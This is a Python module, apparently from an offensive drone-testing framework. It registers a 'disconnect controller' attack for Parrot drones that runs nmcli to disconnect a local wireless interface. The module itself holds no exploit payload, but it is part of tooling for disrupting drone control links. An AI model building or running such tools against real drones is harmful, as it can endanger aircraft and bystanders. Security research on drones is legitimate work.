from shared import Manufacturer, Model, AttackType, InterfaceMode, CommandExecutor
from modules.exploit.base_attack_script import BaseAttackScript, AttackResult, DroneTargetInfo
from modules.exploit.attack_factory import register_attack

@register_attack(
    manufacturer=Manufacturer.PARROT,
    models=[m.value for m in Model],
    attack_types=[AttackType.DISCONNECT_CONTROLLER],
)
class DisconnectControllerDeviceParrot(BaseAttackScript):
    def __init__(self, target_info: DroneTargetInfo):
        super().__init__(target_info); self.exec = CommandExecutor()

    def attack(self) -> AttackResult:
        pre = self._ensure_interface_mode(InterfaceMode.MANAGED)
        if not pre.status: return pre

        try:
            r = self.exec.execute(["nmcli", "device", "disconnect", self.target_info.interface.iface_name],
                                  timeout=10, sudo=self.target_info.use_sudo)
            return AttackResult(True, r.stdout, r.stderr, "Controller device disconnected")
        except Exception as e:
            return AttackResult(False, "", str(e), "Failed to disconnect controller")
